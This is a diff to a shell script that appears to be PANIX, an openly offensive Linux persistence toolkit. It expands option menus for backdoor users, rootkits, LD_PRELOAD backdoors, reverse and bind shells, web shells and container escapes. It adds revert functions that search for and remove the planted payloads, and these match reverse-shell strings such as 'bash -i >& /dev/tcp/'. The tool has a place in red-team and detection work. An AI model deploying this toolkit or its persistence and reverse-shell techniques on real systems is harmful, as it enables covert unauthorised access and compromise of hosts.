@@ -25,63 +25,136 @@ usage_user() {
 	echo ""
 	echo "Low Privileged User Options:"
 	echo ""
-	echo "  --at                  At job persistence"
-	echo "  --authorized-keys     Add public key to authorized keys"
-	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
-	echo "  --cron                Cron job persistence"
-	echo "  --docker-container    Docker container with host escape (requires docker group permissions)"
-	echo "  --git                 Git persistence"
-	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
-	echo "  --shell-profile       Shell profile persistence"
-	echo "  --ssh-key             SSH key persistence"
-	echo "  --systemd             Systemd service persistence"
-	echo "  --web-shell           Web shell persistence (PHP/Python)"
-	echo "  --xdg                 XDG autostart persistence"
-	echo "  --revert              Revert most changes made by PANIX' default options"
-	echo "  --mitre-matrix        Display the MITRE ATT&CK Matrix for PANIX"
-	echo "  --quiet (-q)          Quiet mode (no banner)"
+	echo "  --at                   At job persistence"
+	echo "  --authorized-keys      Add public key to authorized keys"
+	echo "  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)"
+	echo "  --cron                 Cron job persistence"
+	echo "  --git                  Git persistence"
+	echo "  --malicious-container  Docker container with host escape (requires docker group permissions)"
+	echo "  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)"
+	echo "  --shell-profile        Shell profile persistence"
+	echo "  --ssh-key              SSH key persistence"
+	echo "  --systemd              Systemd service persistence"
+	echo "  --web-shell            Web shell persistence (PHP/Python)"
+	echo "  --xdg                  XDG autostart persistence"
+	echo "  --revert               Revert most changes made by PANIX' default options"
+	echo "  --mitre-matrix         Display the MITRE ATT&CK Matrix for PANIX"
+	echo "  --quiet (-q)           Quiet mode (no banner)"
 }
 
 usage_root() {
 	echo ""
 	echo "Root User Options:"
 	echo ""
-	echo "  --at                  At job persistence"
-	echo "  --authorized-keys     Add public key to authorized keys"
-	echo "  --backdoor-user       Create backdoor user"
-	echo "  --bind-shell          Execute backgrounded bind shell (supports multiple LOLBins)"
-	echo "  --cap                 Add capabilities persistence"
-	echo "  --create-user         Create a new user"
-	echo "  --cron                Cron job persistence"
-	echo "  --docker-container    Docker container with host escape"
-	echo "  --generator           Generator persistence"
-	echo "  --git                 Git hook/pager persistence"
-	echo "  --initd               SysV Init (init.d) persistence"
-	echo "  --ld-preload          LD_PRELOAD backdoor persistence"
-	echo "  --lkm                 Loadable Kernel Module (LKM) persistence"
-	echo "  --malicious-package   Build and Install a package for persistence (DPKG/RPM)"
-	echo "  --motd                Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
-	echo "  --package-manager     Package Manager persistence (APT/YUM/DNF)"
-	echo "  --pam                 Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)"
-	echo "  --passwd-user         Add user to /etc/passwd directly"
-	echo "  --password-change     Change user password"
-	echo "  --rc-local            Run Control (rc.local) persistence"
-	echo "  --reverse-shell       Reverse shell persistence (supports multiple LOLBins)"
-	echo "  --rootkit             Diamorphine (LKM) rootkit persistence"
-	echo "  --shell-profile       Shell profile persistence"
-	echo "  --ssh-key             SSH key persistence"
-	echo "  --sudoers             Sudoers persistence"
-	echo "  --suid                SUID persistence"
-	echo "  --system-binary       System binary persistence"
-	echo "  --systemd             Systemd service persistence"
-	echo "  --udev                Udev (driver) persistence"
-	echo "  --web-shell           Web shell persistence (PHP/Python)"
-	echo "  --xdg                 XDG autostart persistence"
-	echo "  --revert              Revert most changes made by PANIX' default options"
-	echo "  --mitre-matrix        Display the MITRE ATT&CK Matrix for PANIX"
-	echo "  --quiet (-q)          Quiet mode (no banner)"
+	echo "  --at                   At job persistence"
+	echo "  --authorized-keys      Add public key to authorized keys"
+	echo "  --backdoor-user        Create backdoor user"
+	echo "  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)"
+	echo "  --cap                  Add capabilities persistence"
+	echo "  --create-user          Create a new user"
+	echo "  --cron                 Cron job persistence"
+	echo "  --generator            Generator persistence"
+	echo "  --git                  Git hook/pager persistence"
+	echo "  --initd                SysV Init (init.d) persistence"
+	echo "  --ld-preload           LD_PRELOAD backdoor persistence"
+	echo "  --lkm                  Loadable Kernel Module (LKM) persistence"
+	echo "  --malicious-container  Docker container with host escape"
+	echo "  --malicious-package    Build and Install a package for persistence (DPKG/RPM)"
+	echo "  --motd                 Message Of The Day (MOTD) persistence (not available on RHEL derivatives)"
+	echo "  --package-manager      Package Manager persistence (APT/YUM/DNF)"
+	echo "  --pam                  Pluggable Authentication Module (PAM) persistence (backdoored PAM & pam_exec)"
+	echo "  --passwd-user          Add user to /etc/passwd directly"
+	echo "  --password-change      Change user password"
+	echo "  --rc-local             Run Control (rc.local) persistence"
+	echo "  --reverse-shell        Reverse shell persistence (supports multiple LOLBins)"
+	echo "  --rootkit              Diamorphine (LKM) rootkit persistence"
+	echo "  --shell-profile        Shell profile persistence"
+	echo "  --ssh-key              SSH key persistence"
+	echo "  --sudoers              Sudoers persistence"
+	echo "  --suid                 SUID persistence"
+	echo "  --system-binary        System binary persistence"
+	echo "  --systemd              Systemd service persistence"
+	echo "  --udev                 Udev (driver) persistence"
+	echo "  --web-shell            Web shell persistence (PHP/Python)"
+	echo "  --xdg                  XDG autostart persistence"
+	echo "  --revert               Revert most changes made by PANIX' default options"
+	echo "  --mitre-matrix         Display the MITRE ATT&CK Matrix for PANIX"
+	echo "  --quiet (-q)           Quiet mode (no banner)"
 	echo ""
 }
+
+# All revert functions
+revert_all() {
+	echo "[+] Reverting all modules..."
+	
+	local modules=(
+		revert_at
+		revert_authorized_keys
+		revert_backdoor_user
+		revert_bind_shell
+		revert_cap
+		revert_create_user
+		revert_cron
+		revert_generator
+		revert_git
+		revert_initd
+		revert_ld_preload
+		revert_lkm
+		revert_malicious_container
+		revert_malicious_package
+		revert_motd_backdoor
+		revert_package_manager
+		revert_pam
+		revert_passwd_user
+		revert_password_change
+		revert_rc_local
+		revert_reverse_shell
+		revert_rootkit
+		revert_shell_profile
+		revert_ssh_key
+		revert_sudoers
+		revert_suid
+		revert_system_binary
+		revert_systemd
+		revert_udev
+		revert_web_shell
+		revert_xdg
+	)
+
+	# Disable exit on error
+	set +e
+
+	for module in "${modules[@]}"; do
+		echo ""
+		echo "######################### [+] Reverting $module... #########################"
+		echo ""
+
+		# Check if the module exists
+		if ! command -v "$module" &>/dev/null; then
+			echo "[-] Function $module not found. Skipping..."
+			continue
+		fi
+
+		# Execute the module and capture its exit status
+		"$module"
+		local exit_code=$?
+		if [[ $exit_code -eq 0 ]]; then
+			echo ""
+			echo "[+] $module reverted successfully."
+			echo ""
+		else
+			echo ""
+			echo "[-] Failed to revert $module. Exit Code: $exit_code"
+			echo ""
+		fi
+	done
+
+	# Re-enable exit on error
+	set -e
+
+	echo "[+] Reversion of all modules complete."
+}
+
 
 # Module: setup_at.sh
 setup_at() {
@@ -102,6 +175,7 @@ setup_at() {
 		echo "--custom                     Use custom at settings"
 		echo "  --command <command>          Specify custom persistence command"
 		echo "  --time <time>                Specify time for at job (e.g., now + 1 minute)"
+        echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -181,6 +255,37 @@ setup_at() {
 	echo "[+] At job persistence established!"
 }
 
+# Revert Module: revert_at.sh
+revert_at() {
+	usage_revert_at() {
+		echo "Usage: ./panix.sh --revert at"
+		echo "Reverts any changes made by the setup_at module."
+	}
+
+	if ! command -v at &> /dev/null; then
+		echo "Error: 'at' binary is not present. Cannot revert 'at' jobs."
+		return 1
+	fi
+
+	# Fetch all queued `at` jobs
+	jobs=$(atq | awk '{print $1}')
+	if [[ -z "$jobs" ]]; then
+		echo "[-] No 'at' jobs found to revert."
+		return 0
+	fi
+
+	# Iterate over each job, check its command, and remove if it matches known patterns
+	for job in $jobs; do
+		job_info=$(at -c "$job")
+		if [[ "$job_info" =~ "sh -i >& /dev/tcp" || "$job_info" =~ "/bin/bash -c" ]]; then
+			atrm "$job"
+			echo "[+] Removed matching 'at' job with ID $job."
+		fi
+	done
+
+    return 0
+}
+
 # Module: setup_authorized_keys.sh
 setup_authorized_keys() {
 	local key=""
@@ -198,12 +303,14 @@ setup_authorized_keys() {
 			echo "--custom                     Use custom authorized keys settings"
 			echo "  --key <key>                  Specify the public key"
 			echo "  --path <path>                Specify custom authorized keys file path"
+            echo "--help|-h                    Show this help message"
 		else
 			echo "Usage: ./panix.sh --authorized-keys [OPTIONS]"
 			echo "Low Privileged User Options:"
 			echo "--examples                   Display command examples"
 			echo "--default                    Use default authorized keys settings"
 			echo "  --key <key>                  Specify the public key"
+            echo "--help|-h                    Show this help message"
 		fi
 	}
 
@@ -276,10 +383,42 @@ setup_authorized_keys() {
 	fi
 
 	mkdir -p $(dirname $path)
+	echo "[+] Backing up authorized_keys file to $path.bak"
+	cp $path $path.bak
 	echo $key >> $path
 	chmod 600 $path
 
 	echo "[+] Authorized_keys persistence established!"
+}
+
+# Revert Module: revert_authorized_keys.sh
+revert_authorized_keys() {
+	local path=""
+
+	usage_revert_authorized_keys() {
+		echo "Usage: ./panix.sh --revert authorized-keys"
+		echo "Reverts any changes made by the setup_authorized_keys module."
+	}
+
+	if check_root; then
+		path="/root/.ssh/authorized_keys"
+	else
+		local current_user=$(whoami)
+		path="/home/$current_user/.ssh/authorized_keys"
+	fi
+
+	if [[ -f "${path}.bak" ]]; then
+		echo "[+] Restoring backup from ${path}.bak to $path."
+		mv "${path}.bak" "$path"
+		chmod 600 "$path"
+		echo "[+] Revert complete: Restored $path from backup."
+		return 1
+	else
+		echo "[-] Backup file ${path}.bak not found. No changes made."
+		return 0
+	fi
+
+	return 0
 }
 
 # Module: setup_backdoor_user.sh
@@ -290,6 +429,7 @@ setup_backdoor_user() {
 		echo "Usage: ./panix.sh --backdoor-user [OPTIONS]"
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
+        echo "--help|-h                  Show this help message"
 	}
 
 	if ! check_root; then
@@ -337,6 +477,49 @@ setup_backdoor_user() {
 	echo "[+] Backdoor user persistence established!"
 }
 
+# Revert Module: revert_backdoor_user.sh
+revert_backdoor_user() {
+	usage_revert_backdoor_user() {
+		echo "Usage: ./panix.sh --revert backdoor-user"
+		echo "Reverts any changes made by the setup_backdoor_user module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Find users with UID 0 and not named 'root'
+	backdoor_users=$(awk -F: '($3 == 0) && ($1 != "root") {print $1}' /etc/passwd)
+
+	if [[ -z "$backdoor_users" ]]; then
+		echo "[+] No backdoor users found."
+		return 0
+	fi
+
+	for username in $backdoor_users; do
+		echo "[+] Found backdoor user: $username"
+
+		# Get next available UID above 1000
+		next_uid=$(awk -F: 'BEGIN {max=999} ($3>=1000 && $3>max) {max=$3} END {print max+1}' /etc/passwd)
+
+		# Backup /etc/passwd before making changes
+		cp /etc/passwd /etc/passwd.bak
+		echo "[+] Backup of /etc/passwd created at /etc/passwd.bak"
+
+		# Use sed to change the UID from 0 to next available UID
+		sed -i "s/^\($username:[^:]*:\)0:/\1$next_uid:/" /etc/passwd
+
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Changed UID of $username to $next_uid in /etc/passwd."
+		else
+			echo "[-] Failed to change UID for user $username."
+		fi
+	done
+
+	return 0
+}
+
 # Module: setup_bind_shell.sh
 setup_bind_shell() {
 	local default=0
@@ -361,6 +544,7 @@ setup_bind_shell() {
 		echo "    --port <port>                             Specify port to bind shell to"
 		echo "--custom                                  Use custom bind shell binary"
 		echo "  --binary <binary>                         Specify the path to the custom binary"
+        echo "--help|-h                                 Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -592,6 +776,70 @@ setup_bind_shell() {
 	fi
 }
 
+# Revert Module: revert_bind_shell.sh
+revert_bind_shell() {
+	usage_revert_bind_shell() {
+		echo "Usage: ./panix.sh --revert bind-shell"
+		echo "Reverts any changes made by the setup_bind_shell module."
+	}
+
+	# Kill any running bind shell processes started by setup_bind_shell
+
+	echo "[+] Searchnig for bind shell processes and killing them if present..."
+
+	# Kill shellcode bind shells (/tmp/bd86 and /tmp/bd64)
+	if [[ -f /tmp/bd86 ]]; then
+		echo "[+] Found /tmp/bd86 binary. Killing process and removing binary..."
+		pkill -f "/tmp/bd86"
+		rm -f /tmp/bd86
+	fi
+
+	if [[ -f /tmp/bd64 ]]; then
+		echo "[+] Found /tmp/bd64 binary. Killing process and removing binary..."
+		pkill -f "/tmp/bd64"
+		rm -f /tmp/bd64
+	fi
+
+	# Kill netcat bind shell processes
+	if pgrep -f "nc\.traditional.*-l.*-p" > /dev/null; then
+		echo "[+] Found Netcat (nc.traditional) bind shell process(es). Killing..."
+		pkill -f "nc\.traditional.*-l.*-p"
+	fi
+
+	if pgrep -f "nc.*-l.*-p" > /dev/null; then
+		echo "[+] Found Netcat bind shell process(es). Killing..."
+		pkill -f "nc.*-l.*-p"
+	fi
+
+	# Kill Node.js bind shell processes
+	if pgrep -f "node -e" > /dev/null; then
+		echo "[+] Found Node.js bind shell process(es). Killing..."
+		pkill -f "node -e"
+	fi
+
+	# Kill Socat bind shell processes
+	if pgrep -f "socat TCP-LISTEN" > /dev/null; then
+		echo "[+] Found Socat bind shell process(es). Killing..."
+		pkill -f "socat TCP-LISTEN"
+	fi
+
+	# Kill Socket bind shell processes
+	if pgrep -f "socket -svp" > /dev/null; then
+		echo "[+] Found Socket bind shell process(es). Killing..."
+		pkill -f "socket -svp"
+	fi
+
+	# Remove custom binary if known
+	# If a custom binary path was used, it should be stored or known; assuming /tmp/custom_bind_shell
+	if [[ -f /tmp/custom_bind_shell ]]; then
+		echo "[+] Found custom bind shell binary at /tmp/custom_bind_shell. Killing process and removing binary..."
+		pkill -f "/tmp/custom_bind_shell"
+		rm -f /tmp/custom_bind_shell
+	fi
+
+	return 0
+}
+
 # Module: setup_cap_backdoor.sh
 setup_cap_backdoor() {
 	local default=0
@@ -609,8 +857,9 @@ setup_cap_backdoor() {
 		echo "--examples                   Display command examples"
 		echo "--default                    Use default capabilities settings"
 		echo "--custom                     Use custom capabilities settings"
-		echo "  --capability <capability>   Specify the capability"
-		echo "  --binary <binary>           Specify the path to the binary"
+		echo "  --capability <capability>    Specify the capability"
+		echo "  --binary <binary>            Specify the path to the binary"
+        echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -716,6 +965,90 @@ setup_cap_backdoor() {
 	echo "[+] Capabilities backdoor persistence established!"
 }
 
+# Revert Module: revert_cap_backdoor.sh
+revert_cap() {
+	usage_revert_cap() {
+		echo "Usage: ./panix.sh --revert cap"
+		echo "Reverts any changes made by the setup_cap_backdoor module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Function to escape special characters in sed patterns
+	escape_sed_pattern() {
+		local pattern="$1"
+		# Escape |, \, /, and & characters
+		printf '%s' "$pattern" | sed 's/[|\\/&]/\\&/g'
+	}
+
+	# Function to verify if a file is a regular file
+	is_regular_file() {
+		local file="$1"
+		if [[ -f "$file" ]]; then
+			return 0
+		else
+			return 1
+		fi
+	}
+
+	# Ensure setcap is found
+	if ! command -v setcap &>/dev/null; then
+		if [[ -x /sbin/setcap ]]; then
+			SETCAP="/sbin/setcap"
+		else
+			echo "[-] setcap not found. Ensure the 'libcap2-bin' package is installed."
+			return 1
+		fi
+	else
+		SETCAP=$(command -v setcap)
+	fi
+
+	# List of default binaries modified by setup_cap_backdoor
+	local binaries=("perl" "ruby" "php" "python" "python3" "node")
+
+	for bin in "${binaries[@]}"; do
+		if command -v "$bin" &> /dev/null; then
+			local path
+			path=$(command -v "$bin") || { echo "[-] Failed to find path for $bin"; continue; }
+
+			# Resolve symbolic links to get the real path
+			if command -v realpath &>/dev/null; then
+				path=$(realpath "$path") || { echo "[-] Failed to resolve realpath for $bin"; continue; }
+			elif command -v readlink &>/dev/null; then
+				path=$(readlink -f "$path") || { echo "[-] Failed to resolve readlink for $bin"; continue; }
+			else
+				echo "[-] Neither realpath nor readlink is available to resolve $bin path."
+				continue
+			fi
+
+			# Check if path is a regular file
+			if is_regular_file "$path"; then
+				# Check if the file has any capabilities set
+				if getcap "$path" &>/dev/null; then
+					# Remove capabilities from the binary
+					$SETCAP -r "$path"
+					if [[ $? -eq 0 ]]; then
+						echo "[+] Removed capabilities from $path"
+					else
+						echo "[-] Failed to remove capabilities from $path"
+					fi
+				else
+					echo "[-] No capabilities set on $path. Skipping."
+				fi
+			else
+				echo "[-] $path is not a regular file. Skipping."
+			fi
+		else
+			echo "[-] $bin is not present on the system."
+		fi
+	done
+
+	return 0
+}
+
 # Module: setup_create_new_user.sh
 setup_create_new_user() {
 	local username=""
@@ -731,6 +1064,7 @@ setup_create_new_user() {
 		echo "--examples                 Display command examples"
 		echo "--username <username>      Specify the username"
 		echo "--password <password>      Specify the password"
+        echo "--help|-h                  Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -772,6 +1106,17 @@ setup_create_new_user() {
 	echo "[+] User persistence through the new $username user established!"
 }
 
+# Revert Module: revert_create_new_user.sh
+revert_create_user() {
+
+	echo "[!] Function setup_create_new_user does not have a revert function."
+	return 1
+
+	usage_revert_create_user() {
+		echo "Usage: ./panix.sh --revert create-user"
+		echo "Reverts any changes made by the setup_create_new_user module."
+	}
+}
 # Module: setup_cron.sh
 setup_cron() {
 	local cron_path=""
@@ -812,6 +1157,7 @@ setup_cron() {
 			echo "--default                    Use default systemd settings"
 			echo "  --ip <ip>                    Specify IP address"
 			echo "  --port <port>                Specify port number"
+            echo "--help|-h                    Show this help message"
 		fi
 	}
 
@@ -948,6 +1294,64 @@ setup_cron() {
 	echo "[+] Cron persistence established."
 }
 
+# Revert Module: revert_cron.sh
+revert_cron() {
+
+	usage_revert_cron() {
+		echo "Usage: ./panix.sh --revert cron"
+		echo "Reverts any changes made by the setup_cron module."
+	}
+
+    # Check if crontab command is available
+    if ! command -v crontab &> /dev/null; then
+        echo "Error: 'crontab' command not found."
+        return 1
+    fi
+
+    if check_root; then
+        # For root user, remove the cron file in /etc/cron.d
+        cron_file="/etc/cron.d/freedesktop_timesync1"
+        if [[ -f "$cron_file" ]]; then
+            rm -f "$cron_file"
+            if [[ $? -eq 0 ]]; then
+                echo "[+] Removed cron file $cron_file."
+            else
+                echo "[-] Failed to remove cron file $cron_file."
+            fi
+        else
+            echo "[-] Cron file $cron_file does not exist. No action needed."
+        fi
+    else
+        # For non-root users, remove the cron job from the user's crontab
+        # Identify the command pattern to remove
+        command_pattern="/bin/bash -c 'sh -i >& /dev/tcp/"
+
+        # Get current crontab
+        crontab -l > /tmp/current_cron$$ 2>/dev/null
+        if [[ $? -ne 0 ]]; then
+            echo "[-] No crontab for user $(whoami). No action needed."
+            rm -f /tmp/current_cron$$
+            return 0
+        fi
+
+        # Remove the line containing the command pattern
+        grep -v "$command_pattern" /tmp/current_cron$$ > /tmp/new_cron$$
+
+        # Install the new crontab
+        crontab /tmp/new_cron$$
+        if [[ $? -eq 0 ]]; then
+            echo "[+] Removed cron job from user crontab."
+        else
+            echo "[-] Failed to update user crontab."
+        fi
+
+        # Clean up temporary files
+        rm -f /tmp/current_cron$$ /tmp/new_cron$$
+    fi
+
+    return 0
+}
+
 # Module: setup_generator_persistence.sh
 setup_generator_persistence() {
 	local ip=""
@@ -963,6 +1367,7 @@ setup_generator_persistence() {
 		echo "--examples                   Display command examples"
 		echo "--ip <ip>                    Specify IP address"
 		echo "--port <port>                Specify port number"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1039,6 +1444,76 @@ setup_generator_persistence() {
 	echo "[+] Systemd Generator persistence established!"
 }
 
+# Revert Module: revert_generator_persistence.sh
+revert_generator() {
+	usage_revert_generator() {
+		echo "Usage: ./panix.sh --revert generator"
+		echo "Reverts any changes made by the setup_generator_persistence module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Stop the 'generator' service if it's running
+	if systemctl is-active --quiet generator.service; then
+		echo "[+] Stopping 'generator' service..."
+		systemctl stop generator.service
+	else
+		echo "[-] 'generator' service is not running."
+	fi
+
+	# Disable the 'generator' service
+	if systemctl is-enabled --quiet generator.service; then
+		echo "[+] Disabling 'generator' service..."
+		systemctl disable generator.service
+	else
+		echo "[-] 'generator' service is not enabled."
+	fi
+
+	# Remove the scripts
+	if [[ -f /usr/lib/systemd/system-generators/makecon ]]; then
+		echo "[+] Removing /usr/lib/systemd/system-generators/makecon..."
+		rm -f /usr/lib/systemd/system-generators/makecon
+	else
+		echo "[-] /usr/lib/systemd/system-generators/makecon not found. Skipping."
+	fi
+
+	if [[ -f /usr/lib/systemd/system-generators/generator ]]; then
+		echo "[+] Removing /usr/lib/systemd/system-generators/generator..."
+		rm -f /usr/lib/systemd/system-generators/generator
+	else
+		echo "[-] /usr/lib/systemd/system-generators/generator not found. Skipping."
+	fi
+
+	# Remove the systemd service unit file
+	if [[ -f /run/systemd/system/generator.service ]]; then
+		echo "[+] Removing /run/systemd/system/generator.service..."
+		rm -f /run/systemd/system/generator.service
+	else
+		echo "[-] /run/systemd/system/generator.service not found. Skipping."
+	fi
+
+	# Remove the symlink
+	if [[ -L /run/systemd/system/multi-user.target.wants/generator.service ]]; then
+		echo "[+] Removing symlink /run/systemd/system/multi-user.target.wants/generator.service..."
+		rm -f /run/systemd/system/multi-user.target.wants/generator.service
+	else
+		echo "[-] Symlink /run/systemd/system/multi-user.target.wants/generator.service not found. Skipping."
+	fi
+
+	# Reload systemd daemon
+	echo "[+] Reloading systemd daemon..."
+	systemctl daemon-reload
+
+	# Kill any lingering processes started by 'makecon'
+	echo "[+] Killing any lingering 'makecon' processes..."
+	pkill -f "/usr/lib/systemd/system-generators/makecon"
+
+	return 0
+}
+
 # Module: setup_git_persistence.sh
 setup_git_persistence() {
 	local default=0
@@ -1063,6 +1538,7 @@ setup_git_persistence() {
 		echo "  --path <path>                Specify custom path"
 		echo "  --hook                       Establish Persistence through a Git Hook"
 		echo "  --pager                      Establish Persistence through Git Pager"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1269,6 +1745,81 @@ setup_git_persistence() {
 	echo "[+] Git persistence established!"
 }
 
+# Revert Module: revert_git_persistence.sh
+revert_git() {
+	usage_revert_git() {
+		echo "Usage: ./panix.sh --revert git"
+		echo "Reverts any changes made by the setup_git_persistence module."
+	}
+
+	# Function to remove malicious pre-commit hooks
+	remove_malicious_pre_commit() {
+		local git_repo="$1"
+		local pre_commit_file="$git_repo/.git/hooks/pre-commit"
+
+		if [[ -f $pre_commit_file ]]; then
+			# Check if the pre-commit hook contains the malicious payload
+			if grep -q "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/" "$pre_commit_file"; then
+				rm -f "$pre_commit_file"
+				echo "[+] Removed malicious pre-commit hook from $git_repo"
+			else
+				echo "[-] Pre-commit hook in $git_repo does not contain the malicious payload. Skipping."
+			fi
+		else
+			echo "[-] No pre-commit hook found in $git_repo. Skipping."
+		fi
+	}
+
+	# Function to remove malicious pager configurations
+	remove_malicious_pager() {
+		local config_file="$1"
+
+		if [[ -f $config_file ]]; then
+			# Check if the config contains the malicious pager
+			if grep -q "nohup setsid /bin/bash -c 'bash -i >& /dev/tcp/" "$config_file"; then
+				# Remove the malicious pager line
+				sed -i "/pager = nohup setsid \/bin\/bash -c 'bash -i >& \/dev\/tcp\/.*\/.* 0>&1' > \/dev\/null 2>&1 & \\\${PAGER:-less}/d" "$config_file"
+				echo "[+] Removed malicious pager configuration from $config_file"
+			else
+				echo "[-] No malicious pager configuration found in $config_file. Skipping."
+			fi
+		else
+			echo "[-] Config file $config_file does not exist. Skipping."
+		fi
+	}
+
+	# Function to find Git repositories and remove persistence
+	find_git_repositories_and_revert() {
+		local repos
+		repos=$(find / -type d -name ".git" 2>/dev/null)
+
+		if [[ -z $repos ]]; then
+			echo "[-] No Git repositories found."
+		else
+			for repo in $repos; do
+				local git_repo
+				git_repo=$(dirname "$repo")
+				remove_malicious_pre_commit "$git_repo"
+
+				local git_config="$git_repo/.git/config"
+				remove_malicious_pager "$git_config"
+			done
+		fi
+	}
+
+	# Remove malicious pager from user's global Git config
+	remove_malicious_pager_global() {
+		local user_git_config="$HOME/.gitconfig"
+		remove_malicious_pager "$user_git_config"
+	}
+
+	# Execute the revert functions
+	find_git_repositories_and_revert
+	remove_malicious_pager_global
+
+	return 0
+}
+
 # Module: setup_initd_backdoor.sh
 setup_initd_backdoor() {
 	local default=0
@@ -1292,6 +1843,7 @@ setup_initd_backdoor() {
 		echo "--custom                     Use custom init.d settings"
 		echo "  --command <command>          Specify custom command"
 		echo "  --path <path>                Specify custom /etc/init.d/ file path"
+		echo "--help|-h                    Show this help message"
 	}
 
 	while [[ "$1" != "" ]]; do
@@ -1443,82 +1995,153 @@ setup_initd_backdoor() {
 	fi
 }
 
+# Revert Module: revert_initd_backdoor.sh
+revert_initd() {
+	usage_revert_initd() {
+		echo "Usage: ./panix.sh --revert initd"
+		echo "Reverts any changes made by the setup_initd_backdoor module."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	local initd_path="/etc/init.d/ssh-procps"
+	local service_name=$(basename "$initd_path")
+	local service_path="/etc/systemd/system/${service_name}.service"
+
+	# Stop the service if it's running
+	if systemctl is-active --quiet "$service_name.service"; then
+		echo "[+] Stopping '$service_name' service..."
+		systemctl stop "$service_name.service"
+	else
+		echo "[-] '$service_name' service is not running."
+	fi
+
+	# Disable the service if it's enabled
+	if systemctl is-enabled --quiet "$service_name.service"; then
+		echo "[+] Disabling '$service_name' service..."
+		systemctl disable "$service_name.service"
+	else
+		echo "[-] '$service_name' service is not enabled."
+	fi
+
+	# Remove the systemd service file
+	if [[ -f "$service_path" ]]; then
+		echo "[+] Removing systemd service file '$service_path'..."
+		rm -f "$service_path"
+	else
+		echo "[-] Systemd service file '$service_path' not found."
+	fi
+
+	# Remove the init.d script
+	if [[ -f "$initd_path" ]]; then
+		echo "[+] Removing init.d script '$initd_path'..."
+		rm -f "$initd_path"
+	else
+		echo "[-] Init.d script '$initd_path' not found."
+	fi
+
+	# Remove symlinks created by update-rc.d
+	if command -v update-rc.d &> /dev/null; then
+		echo "[+] Removing init.d symlinks using 'update-rc.d'..."
+		update-rc.d -f "$service_name" remove
+	fi
+
+	# Remove symlinks created by chkconfig
+	if command -v chkconfig &> /dev/null; then
+		echo "[+] Removing init.d symlinks using 'chkconfig'..."
+		chkconfig --del "$service_name"
+	fi
+
+	# Reload systemd daemon
+	echo "[+] Reloading systemd daemon..."
+	systemctl daemon-reload
+
+	# Kill any processes started by the init.d script
+	echo "[+] Killing any processes started by '$initd_path'..."
+	pkill -f "$initd_path"
+
+	return 0
+}
+
 # Module: setup_ld_preload.sh
 setup_ld_preload_backdoor() {
-    local ip=""
-    local port=""
-    local binary=""
-    local preload_compile_dir="/tmp/preload"
-    local preload_name="preload_backdoor"
-    local preload_source="${preload_compile_dir}/${preload_name}.c"
-    local preload_lib="/lib/${preload_name}.so"
-    local preload_file="/etc/ld.so.preload"
+	local ip=""
+	local port=""
+	local binary=""
+	local preload_compile_dir="/tmp/preload"
+	local preload_name="preload_backdoor"
+	local preload_source="${preload_compile_dir}/${preload_name}.c"
+	local preload_lib="/lib/${preload_name}.so"
+	local preload_file="/etc/ld.so.preload"
 
-    # Ensure the function is executed as root
-    if [[ $UID -ne 0 ]]; then
-        echo "Error: This function can only be run as root."
-        exit 1
-    fi
+	# Ensure the function is executed as root
+	if [[ $UID -ne 0 ]]; then
+		echo "Error: This function can only be run as root."
+		exit 1
+	fi
 
-    usage_ld_preload_backdoor() {
-        echo "Usage: ./panix.sh --ld-preload [OPTIONS]"
-        echo "--examples                   Display command examples"
-        echo "--ip <ip>                    Specify IP address for reverse shell"
-        echo "--port <port>                Specify port for reverse shell"
-        echo "--binary <binary>            Specify binary to monitor"
-        echo "--help|-h                    Show this help message"
-    }
+	usage_ld_preload_backdoor() {
+		echo "Usage: ./panix.sh --ld-preload [OPTIONS]"
+		echo "--examples                   Display command examples"
+		echo "--ip <ip>                    Specify IP address for reverse shell"
+		echo "--port <port>                Specify port for reverse shell"
+		echo "--binary <binary>            Specify binary to monitor"
+		echo "--help|-h                    Show this help message"
+	}
 
-    while [[ "$1" != "" ]]; do
-        case $1 in
-            --ip )
-                shift
-                ip=$1
-                ;;
-            --port )
-                shift
-                port=$1
-                ;;
-            --binary )
-                shift
-                binary=$1
-                ;;
-            --examples )
-                echo "Examples:"
-                echo "./panix.sh --ld-preload --ip 192.168.211.131 --port 4444 --binary /usr/bin/whoami"
-                exit 0
-                ;;
-            --help|-h )
-                usage_ld_preload_backdoor
-                exit 0
-                ;;
-            * )
-                echo "Invalid option for --ld-preload: $1"
-                echo "Try './panix.sh --ld-preload --help' for more information."
-                exit 1
-        esac
-        shift
-    done
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--ip )
+				shift
+				ip=$1
+				;;
+			--port )
+				shift
+				port=$1
+				;;
+			--binary )
+				shift
+				binary=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "./panix.sh --ld-preload --ip 192.168.211.131 --port 4444 --binary /usr/bin/whoami"
+				exit 0
+				;;
+			--help|-h )
+				usage_ld_preload_backdoor
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --ld-preload: $1"
+				echo "Try './panix.sh --ld-preload --help' for more information."
+				exit 1
+		esac
+		shift
+	done
 
-    if [[ -z $ip || -z $port || -z $binary ]]; then
-        echo "Error: --ip, --port, and --binary must be specified."
-        echo "Try './panix.sh --ld-preload --help' for more information."
-        exit 1
-    fi
